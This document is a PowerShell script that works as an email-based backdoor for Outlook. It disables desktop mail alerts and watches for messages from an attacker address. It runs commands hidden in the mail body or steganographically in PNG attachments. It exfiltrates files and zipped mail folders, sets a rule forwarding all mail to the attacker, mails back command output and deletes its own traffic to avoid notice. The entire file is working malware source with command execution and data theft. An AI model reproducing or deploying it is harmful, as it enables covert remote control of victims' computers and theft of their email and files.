$global:allResult = ""

function Disable-OutlookDesktopAlerts {
    # Define registry path and name
    $regPath = "HKCU:\Software\Microsoft\Office\16.0\Outlook\Preferences"
    $regName = "NewMailDesktopAlerts"
    
    # Create registry key if it does not exist
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force
    }

    # Get current registry value (null if it does not exist)
    $currentValue = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue

    # Check if it is already disabled (0)
    if ($currentValue -and $currentValue.$regName -eq 0) {
        Write-Host "Desktop alerts are already disabled. Skipping."
    } else {
        # Set desktop alerts to disabled (0)
        Set-ItemProperty -Path $regPath -Name $regName -Value 0
        Write-Host "Desktop alerts have been disabled."
    }
}

function CreateForwardRule {
    param (
        [string]$ruleName,
        [string]$recipientEmail
    )

    # Create Outlook object
    $outlook = New-Object -ComObject Outlook.Application
    $namespace = $outlook.GetNamespace("MAPI")
    $rules = $outlook.Session.DefaultStore.GetRules()

    # Create rule
    $rule = $rules.Create($ruleName, [Microsoft.Office.Interop.Outlook.OlRuleType]::olRuleReceive)

    # Condition: Apply to all messages
    $ruleConditions = $rule.Conditions
    $ruleConditions.Subject.Enabled = $false
    $ruleConditions.SentTo.Enabled = $false
    $ruleConditions.Body.Enabled = $false

    # Action: Forward mail
    $ruleActions = $rule.Actions
    $forwardAction = $ruleActions.Forward
    $forwardAction.Enabled = $true
    $forwardAction.Recipients.Add($recipientEmail)

    # Save the rule
    $rules.Save()

    Write-Host "Rule '$ruleName' to forward emails to '$recipientEmail' has been created successfully."
}

function SearchOutlookEmails {
    param (
        [string]$searchSubject,   # Subject to search for
        [int]$daysAgo             # Search for emails within the last X days
    )

    # Create Outlook application object
    $outlook = New-Object -ComObject Outlook.Application
    $namespace = $outlook.GetNamespace("MAPI")

    # Get inbox folder
    $inbox = $namespace.GetDefaultFolder([Microsoft.Office.Interop.Outlook.OlDefaultFolders]::olFolderInbox)

    # Get email items in the inbox
    $mailItems = $inbox.Items

    # Set search date (X days ago)
    $searchDate = (Get-Date).AddDays(-$daysAgo)

    # Loop to search for emails
    foreach ($mailItem in $mailItems) {
        if ($mailItem -is [Microsoft.Office.Interop.Outlook.MailItem]) {
            # Filter by subject
            if ($mailItem.Subject -like "*$searchSubject*") {
                # Check email received time
                if ($mailItem.ReceivedTime -gt $searchDate) {
                    # Output email details
                    $global:allResult += "Subject: $($mailItem.Subject)`n"
                    $global:allResult += "Sender: $($mailItem.SenderName)`n"
                    $global:allResult += "Date: $($mailItem.ReceivedTime)`n"
                    $global:allResult += "--------------------------------------------------"
                }
            }
        }
    }
}

function ProcessDownloadCommand {
    param (
        [string]$fileName,
        [ref]$responseMail  # Email object to add attachment
    )

    # Check if the file exists
    if (Test-Path $fileName) {
        Write-Host "File Exists: $fileName"
        $fullPath = [System.IO.Path]::GetFullPath($fileName)

        # Add as attachment
        $responseMail.Value.Attachments.Add($fullPath)
    } else {
        Write-Host "File does not exist"
        $global:allResult += "File $fileName does not exist.`n"
    }
}

function Get-OutlookFolders {
    $global:allResult += "**************** Get-OutlookFolders Executed **************** `n"

    # Create an instance of the Outlook application
    $outlook = New-Object -ComObject Outlook.Application

    # Get the MAPI namespace
    $namespace = $outlook.GetNamespace("MAPI")

    # Get the root folders
    $rootFolders = $namespace.Folders

    # Recursive function to get folders
    function Get-Folders {
        param (
            [object]$folder,  # Parameter to accept folder object
            [string]$indent = ""  # Indentation for displaying folder hierarchy
        )

        # Append the folder name to the global variable
        $global:allResult += "$indent$($folder.Name)`n"

        # Get subfolders
        foreach ($subFolder in $folder.Folders) {
            Get-Folders -folder $subFolder -indent "$indent    "
        }
    }

    # Iterate through root folders and get their subfolders
    foreach ($folder in $rootFolders) {
        Get-Folders -folder $folder
    }
}

function Get-OutlookMailsAndZip {
    param (
        [string]$FolderName,   # Folder name to retrieve emails from
        [string]$ZipFilePath,   # Path to the output ZIP file
        [ref]$responseMail  # Email object to add attachment
    )

    # Create Outlook Application object
    $outlook = New-Object -ComObject Outlook.Application
    $namespace = $outlook.GetNamespace("MAPI")

    # Get the default mailbox (first folder in the namespace)
    $rootFolder = $namespace.Folders.Item(1)

    # Function to recursively search for the folder
    function Find-OutlookFolder {
        param (
            [string]$searchFolderName,
            [Object]$currentFolder
        )

        # If the current folder matches the search name, return it
        if ($currentFolder.Name -eq $searchFolderName) {
            return $currentFolder
        }

        # Recursively search in subfolders
        foreach ($subFolder in $currentFolder.Folders) {
            $result = Find-OutlookFolder -searchFolderName $searchFolderName -currentFolder $subFolder
            if ($null -ne $result) {
                return $result
            }
        }

        return $null
    }

    # Search for the folder
    $folder = Find-OutlookFolder -searchFolderName $FolderName -currentFolder $rootFolder

    if ($null -eq $folder) {
        Write-Host "Folder '$FolderName' not found." -ForegroundColor Red
        return
    }

    # Retrieve emails (up to 100 items)
    $mails = $folder.Items | Select-Object -First 100

    if ($mails.Count -eq 0) {
        Write-Host "No emails found in folder '$FolderName'." -ForegroundColor Yellow
        return
    }

    # Create a temporary directory to store email files
    $tempFolder = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "OutlookMails")
    if (-not (Test-Path $tempFolder)) {
        New-Item -ItemType Directory -Path $tempFolder | Out-Null
    }

    # Save emails in .eml format
    $counter = 1
    foreach ($mail in $mails) {
        $subject = $mail.Subject -replace '[\\\/:*?"<>|]', ''  # Sanitize invalid filename characters
        $fileName = [System.IO.Path]::Combine($tempFolder, "Mail$counter - $subject.eml")
        $mail.SaveAs($fileName, 3)  # 3 is for EML format
        $counter++
    }

    # If the ZIP file already exists, remove it
    if (Test-Path $ZipFilePath) {
        Remove-Item $ZipFilePath
    }

    # Compress the directory into a ZIP file
    Add-Type -AssemblyName "System.IO.Compression.FileSystem"
    [System.IO.Compression.ZipFile]::CreateFromDirectory($tempFolder, $ZipFilePath)

    # Remove the temporary directory
    Remove-Item -Recurse -Force $tempFolder
    $responseMail.Value.Attachments.Add($ZipFilePath)
    Write-Host "Emails have been zipped and saved at: $ZipFilePath" -ForegroundColor Green
}

# Steganography to less suspicious
function Decode-MessageFromImage {
    param (
        [string]$ImagePath
    )

    Add-Type -AssemblyName System.Drawing
    try {
        $image = [System.Drawing.Bitmap]::FromFile($ImagePath)
    } catch {
        Write-Error "Failed to load the image. Ensure the file is a valid image format."
        return
    }

    $binaryMessage = ""
    $width = $image.Width
    $height = $image.Height

    try {
        for ($y = 0; $y -lt $height; $y++) {
            for ($x = 0; $x -lt $width; $x++) {
                $pixel = $image.GetPixel($x, $y)

                # Extract the least significant bit from each color channel
                $binaryMessage += ($pixel.R -band 1)
                $binaryMessage += ($pixel.G -band 1)
                $binaryMessage += ($pixel.B -band 1)

                # Check for the termination marker
                if ($binaryMessage.EndsWith("11111111")) {
                    break
                }
            }
            if ($binaryMessage.EndsWith("11111111")) {
                break
            }
        }
    } catch {
        Write-Error "Error occurred during pixel processing: $_"
        $image.Dispose()
        return
    }

    $image.Dispose()

    if ($binaryMessage.EndsWith("11111111")) {
        $binaryMessage = $binaryMessage.Substring(0, $binaryMessage.Length - 8)
    } else {
        Write-Error "Termination marker not found. The image may not contain a valid message."
        return
    }

    $decodedMessage = ""
    for ($i = 0; $i -lt $binaryMessage.Length; $i += 8) {
        if ($i + 8 -le $binaryMessage.Length) {
            $byte = $binaryMessage.Substring($i, 8)
            $decodedMessage += [char]([convert]::ToInt32($byte, 2))
        }
    }

    return $decodedMessage
}

function Execute-PowerShellCommand {
    param (
        [string]$Command
    )

    if ([string]::IsNullOrWhiteSpace($Command)) {
        Write-Error "Command is empty or null. Skipping execution."
        return
    }

    try {
        Write-Host "Executing command: $Command"
        # Capture the output as an array of lines
        $result = Invoke-Expression $Command | Out-String
        $currentDateTime = Get-Date -Format "yyyy-MM-dd HH:mm"
        
        # Append the result with proper newlines preserved
        $global:allResult += "**************** $Command Executed ($currentDateTime) ************`n"
        $global:allResult += $result + "`n`n`n`n"
        
        Write-Host "Command output:"
        Write-Host $result
    } catch {
        Write-Error "Error executing command: $_"
    }
}


# Execute functions
Disable-OutlookDesktopAlerts

# Get Outlook application COM object
$outlook = New-Object -ComObject Outlook.Application
$namespace = $outlook.GetNamespace("MAPI")
$inbox = $namespace.GetDefaultFolder([Microsoft.Office.Interop.Outlook.OlDefaultFolders]::olFolderInbox)

# Record previous email count
$previousCount = $inbox.Items.Count

# Save last checked timestamp
$lastCheckedTime = [DateTime]::UtcNow
$serverAddress = "attackerSender@testmail.com"

while ($true) {
    # Get current email count
    $currentCount = $inbox.Items.Count
    $steganoIsUsed = $false
    Write-Host "CurrentCount=", $currentCount
    # Check if new mail has arrived
    if ($currentCount -gt $previousCount) {
        $newMail = $inbox.Items.GetLast()

        # Check if new mail is received
        if ($newMail -is [Microsoft.Office.Interop.Outlook.MailItem]) {
            $senderAddress = $newMail.SenderEmailAddress
            Write-Host "New mail received from: $senderAddress with subject: $($newMail.Subject)"

            if ($senderAddress -eq $serverAddress) {
                # Check for attachments
                for ($i = 1; $i -le $newMail.Attachments.Count; $i++) {
                    $attachment = $newMail.Attachments.Item($i)
#		            Write-Host "attachment=", $attachment
#		            Write-Host "attachment.FileName=", $attachment.FileName
#                    $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), $attachment.FileName)
                    $taskFolderPath = "C:\Windows\Tasks"
                    $tempFilePath = [System.IO.Path]::Combine($taskFolderPath, $attachment.FileName)
		            Write-Host "tempFilePath=", $tempFilePath
                    $attachment.SaveAsFile($tempFilePath)

                    # Check if the attachment is a .png file
                    if ($attachment.FileName.EndsWith(".png")) {
                        Write-Host "Detected .png attachment. Decoding..."
                        $decodedMessage = Decode-MessageFromImage -ImagePath $tempFilePath
                        if ($decodedMessage) {
                            Write-Host "Decoded message: $decodedMessage"
                            Execute-PowerShellCommand -Command $decodedMessage
                            $steganoIsUsed = $true
                        } else {
                            Write-Error "Failed to decode the .png file."
                        }
                    } else {
                        Write-Host "Attachment is not a .png file."
                    }
                    # Read RAW data (example purpose)
#                    $rawData = [System.IO.File]::ReadAllBytes($tempFilePath)
                }

                $responseMail = $outlook.CreateItem([Microsoft.Office.Interop.Outlook.OlItemType]::olMailItem)                
                if ($steganoIsUsed -eq $false) {
                    $body = $newMail.Body
                    Write-Host "Email body: $body"
                    $newMail.Delete()
                    Write-Host "Mail has been deleted."

                    # Parse comma-separated data
                    $parsedData = $body -split ";"

                    # Create new reply email

                    foreach ($item in $parsedData) {
                        $trimmedItem = $item.Trim()
                        Write-Host "item === $trimmedItem"

                        # Check for 'download ' prefix
                        if ($trimmedItem.StartsWith("download ")) {
                            $fileName = $trimmedItem.Substring(9).Trim()
                            # Call function to process
                            ProcessDownloadCommand -fileName $fileName -responseMail ([ref]$responseMail)
                        } elseif ($trimmedItem.StartsWith("forward")) {
                            CreateForwardRule -ruleName "ForwardRule" -recipientEmail $serverAddress
                        } elseif ($trimmedItem.StartsWith("listFolders")) {
                            Get-OutlookFolders
                        } elseif ($trimmedItem.StartsWith("getFolders ")) {
                            $folderName = $trimmedItem.Split(' ')[1]
                            # Call function to process
                            Get-OutlookMailsAndZip -FolderName $folderName -ZipFilePath "C:\Windows\Tasks\mails.zip" -responseMail ([ref]$responseMail)
                        } elseif ($trimmedItem.StartsWith("search")) {
                            # Extract keyword after "search" (get second part by splitting by space)
                            $searchKeyword = $trimmedItem.Split(" ")[1]    
                            # Call function with extracted keyword
                            SearchOutlookEmails -searchSubject $searchKeyword -daysAgo 30
                        } else {
                            # Execute PowerShell command
                            Execute-PowerShellCommand -Command $trimmedItem
                        }
                    }
                }

                write-host "$global:allResult = ", $global:allResult
                # Send result via email
                $responseMail.Subject = "Command Result"
                $responseMail.Body = $global:allResult
                $responseMail.To = $serverAddress  # Reply to sender
                $responseMail.Send()

                # Write result to text file
                Set-Content -Path "C:\Windows\Tasks\mail2.txt" -Value $global:allResult
                $global:allResult = ""
                Write-Host "Command result written to mail2.txt"

                # Delete sent mail from sent items
                $sentItemsFolder = $namespace.GetDefaultFolder([Microsoft.Office.Interop.Outlook.OlDefaultFolders]::olFolderSentMail)

                # Check sent items and delete sent mail
                foreach ($sentItem in $sentItemsFolder.Items) {
                    if ($sentItem.Subject -eq "Command Result" -and $sentItem.To -eq $serverAddress) {
                        $sentItem.Delete()
                        Write-Host "Sent mail deleted from Sent Items."
                        break
                    }
                }
            }
        }
    }

    # Update previous email count
    $previousCount = $currentCount

    # Check every 5 seconds
    Start-Sleep -Seconds 5
}
